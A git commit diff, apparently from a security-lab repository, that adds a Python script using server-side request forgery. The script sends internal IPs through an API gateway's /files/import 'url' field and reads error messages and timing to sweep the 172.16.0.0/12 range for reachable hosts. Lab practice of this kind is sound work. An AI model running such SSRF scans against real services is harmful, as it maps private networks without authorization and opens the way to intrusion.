2cccd22d540ec57dc0290485809df610611c95fa
dvdg6566 <czhdaniel@gmail.com>
2024-06-15 15:14:20 +0800

    Added IP scanning (api gateway)

---
+++ labs/apigateway/gatewayscan.py
@@ -0,0 +1,22 @@
+import argparse
+import json
+import requests
+
+from test_url import check_ip
+
+print("IP Gateway scan for sunet 172.16.0.0/12:")
+print()
+
+A = []
+
+# check_ip("172.16.16.1")
+for a in range(16,32):
+	for b in range(1,256):
+		ip = f"172.{a}.{b}.1"
+
+		res = check_ip(ip)
+		if res:
+			print(f"{ip}\tOPEN")
+			A.append(ip)
+		else:
+			print(f"{ip}\tCLOSED")
--- labs/apigateway/test_url.py
+++ labs/apigateway/test_url.py
@@ -24,12 +24,48 @@ def check_url(url):
 		print("An error has occured")
 		return False
 
+def check_ip(ip):
+	target = "http://apigateway:8000/files/import"
+	headers = {
+		"Content-Type": "application/json"
+	}
+	data = {
+		"url": f"http://{ip}"
+	}
+	r = requests.post(target,data=json.dumps(data),headers=headers)
+	# print(r.text)
+	text = r.text
+	elapsed = r.elapsed.total_seconds()
+	
+	# print(f"Searching: {ip}")
+	# print(text)
+	# print(elapsed)
+
+	if elapsed > 30:
+		return False
+	elif "You don't have permission" in text:
+		print("Port open!")
+		return True
+	elif "ECONNREFUSED" in text: 
+		return True
+	elif "getaddrinfo" in text:
+		return False
+	else:
+		print("Error")
+		print(r.text)
+	
+
 def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-u','--url', help='Target url to check')
 	args = parser.parse_args()
 	url = args.url
-	return check_url(url)
+	check_ip("127.0.0.1")
+	check_ip("192.168.45.205")
+	check_ip("192.168.173.135")
+	check_ip("244.244.244.244")
+	check_ip("277.77.77.77")
+	# check_url(url)
 
 if __name__ == '__main__':
 	debug = True
